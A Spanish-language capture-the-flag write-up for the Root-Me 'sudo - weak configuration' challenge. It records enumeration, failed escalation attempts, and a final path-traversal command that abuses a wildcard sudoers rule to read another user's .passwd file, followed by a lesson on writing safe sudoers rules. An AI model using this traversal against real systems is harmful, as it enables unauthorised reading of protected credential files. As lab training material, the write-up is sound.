Writeup: sudo - weak configuration (Root Me)
📋 Información General
Campo	Valor
Plataforma	Root-Me
Categoría	Escalada de Privilegios
Nivel	Fácil (5 puntos)
Usuario	app-script-ch1
🎯 Objetivo

Leer el archivo .passwd en /challenge/app-script/ch1/ch1cracked/
🔍 Fase 1: Enumeración Inicial
1.1 Estructura del Directorio
bash

app-script-ch1@challenge02:~$ ls -la
total 28
dr-xr-x---  4 app-script-ch1-cracked app-script-ch1         4096 Dec 10  2021 .
drwxr-xr-x 25 root                   root                   4096 Sep  5  2023 ..
-r--------  1 root                   root                    921 Dec 10  2021 ._perms
-rw-r-----  1 root                   root                     42 Dec 10  2021 .git
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1-cracked 4096 Dec 10  2021 ch1cracked
dr-xr-x--x  2 app-script-ch1-cracked app-script-ch1         4096 Dec 10  2021 notes
-rw-r-----  1 app-script-ch1         app-script-ch1          217 Dec 10  2021 readme.md

1.2 Análisis de Permisos
bash

# Directorio ch1cracked - solo ejecución para otros
app-script-ch1@challenge02:~$ stat /challenge/app-script/ch1/ch1cracked/
Access: (0551/dr-xr-x--x)  Uid: ( 1401/app-script-ch1-cracked)   Gid: ( 1401/app-script-ch1-cracked)

# Archivo objetivo
app-script-ch1@challenge02:~$ ls -la /challenge/app-script/ch1/ch1cracked/.passwd 2>/dev/null
-r--r----- 1 app-script-ch1-cracked app-script-ch1-cracked 21 Dec 10  2021 .passwd

# Intentar leerlo
app-script-ch1@challenge02:~$ cat /challenge/app-script/ch1/ch1cracked/.passwd
cat: Permission denied

Conclusiones:

    app-script-ch1 NO es miembro del grupo app-script-ch1-cracked

    No podemos leer el archivo directamente

    El directorio ch1cracked/ no contiene archivos ejecutables

🕵️ Fase 2: Enumeración de Privilegios
2.1 Archivos Sudoers
bash

app-script-ch1@challenge02:~$ ls -la /etc/sudoers.d/
-rw-r--r-- 1 root root 990 Jul 28 04:11 app-script-ch14-sudoers
-rw-r--r-- 1 root root  93 Oct 23  2020 app-script-ch3-sudoers

bash

app-script-ch1@challenge02:~$ cat /etc/sudoers.d/app-script-ch14-sudoers
app-script-ch14     challenge02=(app-script-ch14-2) NOPASSWD: /usr/bin/python
app-script-ch14-2   challenge02=(app-script-ch14-3) NOPASSWD: /bin/tar
app-script-ch14-3   challenge02=(app-script-ch14-4) NOPASSWD: /usr/bin/zip
app-script-ch14-4   challenge02=(app-script-ch14-5) NOPASSWD: /usr/bin/awk
app-script-ch14-5   challenge02=(app-script-ch14-6) NOPASSWD: /usr/bin/gdb
app-script-ch14-6   challenge02=(app-script-ch14-7) NOPASSWD: /usr/bin/pico
app-script-ch14-7   challenge02=(app-script-ch14-8) NOPASSWD: /usr/bin/scp
app-script-ch14-8   challenge02=(app-script-ch14-9) NOPASSWD: /usr/bin/env
app-script-ch14-9   challenge02=(app-script-ch14-10) NOPASSWD: /usr/bin/ssh
app-script-ch14-10   challenge02=(app-script-ch14-11) NOPASSWD: /usr/bin/git
app-script-ch14-11   challenge02=(app-script-ch14-12) NOPASSWD: /usr/bin/make
app-script-ch14-12   challenge02=(app-script-ch14-13) NOPASSWD: /usr/bin/script
app-script-ch14-13   challenge02=(app-script-ch14-14) NOPASSWD: /bin/rbash --

bash

app-script-ch1@challenge02:~$ cat /etc/sudoers.d/app-script-ch3-sudoers
app-script-ch3     challenge02=(app-script-ch3-cracked) /challenge/app-script/ch3/ch3.sh --

2.2 Nuestros Grupos
bash

app-script-ch1@challenge02:~$ groups
app-script-ch1 users

2.3 Tareas Programadas (Cron)
bash

app-script-ch1@challenge02:~$ cat /etc/crontab
* * * * * /opt/root-me/common-tools/cron/tmp-space-guard.sh

Hay una tarea cron ejecutándose como root cada minuto.
❌ Fase 3: Vectores Descartados
3.1 Cambio de Usuario
bash

# Probar contraseñas comunes
app-script-ch1@challenge02:~$ su app-script-ch1-cracked
Password:
su: Authentication failure

3.2 Binarios con SUID
bash

app-script-ch1@challenge02:~$ find / -perm -4000 -type f 2>/dev/null
/bin/su
/bin/umount
/usr/bin/sudo
... (solo binarios estándar del sistema)

3.3 Python/Perl
bash

app-script-ch1@challenge02:~$ python3 -c "print(open('/challenge/app-script/ch1/ch1cracked/.passwd').read())"
PermissionError: [Errno 13] Permission denied

app-script-ch1@challenge02:~$ perl -e 'open(F,"/challenge/app-script/ch1/ch1cracked/.passwd"); print <F>'
(no output - Permission denied)

3.4 os.setuid()
bash

app-script-ch1@challenge02:~$ python3 -c "import os; os.setuid(1401)"
Error: [Errno 1] Operation not permitted

3.5 Explotar el Cron

Intentamos crear scripts en /tmp y /var/tmp pero el cron no los ejecutó.
3.6 Usar las Reglas de Otros Usuarios
bash

# Intentar usar regla de app-script-ch3
app-script-ch1@challenge02:~$ sudo -u app-script-ch3-cracked -h challenge02 /challenge/app-script/ch3/ch3.sh -- cat /challenge/app-script/ch1/ch1cracked/.passwd
Sorry, user app-script-ch1 is not allowed to execute...

# Intentar usar regla de app-script-ch14-8
app-script-ch1@challenge02:~$ sudo -u app-script-ch14-8 -h challenge02 /usr/bin/env cat /challenge/app-script/ch1/ch1cracked/.passwd
Sorry, user app-script-ch1 is not allowed to execute...

💡 Fase 4: El Momento Clave
4.1 Listar Privilegios con sudo -l

Crucial: Sabíamos que sudo -l pedía contraseña, pero la contraseña era la de app-script-ch1, que ya teníamos desde el inicio del desafío.
bash

app-script-ch1@challenge02:~$ sudo -l
[sudo] password for app-script-ch1: 
Matching Defaults entries for app-script-ch1 on challenge02:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*

4.2 Análisis de la Regla
text

app-script-ch1 challenge02=(app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*

Componente					Significado
app-script-ch1					Usuario que ejecuta el comando (nosotros)
challenge02					Host donde se aplica
(app-script-ch1-cracked)			Usuario con el que se ejecuta (dueño del .passwd)
/bin/cat /challenge/app-script/ch1/notes/*	Comando permitido

El administrador usó * para simplificar la regla, pero no consideró el "efecto secundario":

    El comodín permite leer CUALQUIER archivo en notes/

    Usando .. podemos salir del directorio y leer cualquier archivo del sistema

💥 Fase 5: Explotación
5.1 Leer la Pista (Opcional)
bash

app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/shared_notes
#####################
        Todo

- Change DHCP pool
- Change IP routing
- Beef up the fw

5.2 Leer el Archivo .passwd
bash

app-script-ch1@challenge02:~$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
**************

¡Flag obtenida! 🎉
📝 Comando Final
bash

sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd

🎯 Lección Aprendida

El error del administrador:
bash

# Configuración débil
/bin/cat /challenge/app-script/ch1/notes/*

# Configuración segura
/bin/cat /challenge/app-script/ch1/notes/shared_notes

    Nunca usar comodines (*) en sudoers

    Especificar rutas completas y exactas

    Considerar que .. puede usarse para path traversal

    El "efecto secundario" siempre existe: el comodín permite leer cualquier archivo

📊 Resumen de Vectores Probados
Vector				Comando				Resultado
Lectura directa			cat .passwd			❌ Permission denied
Cambio de usuario		su app-script-ch1-cracked	❌ Auth failure
Python				python3 -c "open(...)"		❌ Permission denied
Perl				perl -e 'open(...)'		❌ Permission denied
SUID				find / -perm -4000		❌ Sin binarios útiles
Cron				Scripts en /tmp			❌ No ejecutados
os.setuid()			os.setuid(1401)			❌ Operation not permitted
Regla ch3			sudo -u app-script-ch3-cracked	❌ No autorizado
Regla ch14-8			sudo -u app-script-ch14-8	❌ No autorizado
sudo -l				sudo -l				✅ Regla encontrada
Path traversal			cat notes/../ch1cracked/.passwd	✅ FLAG
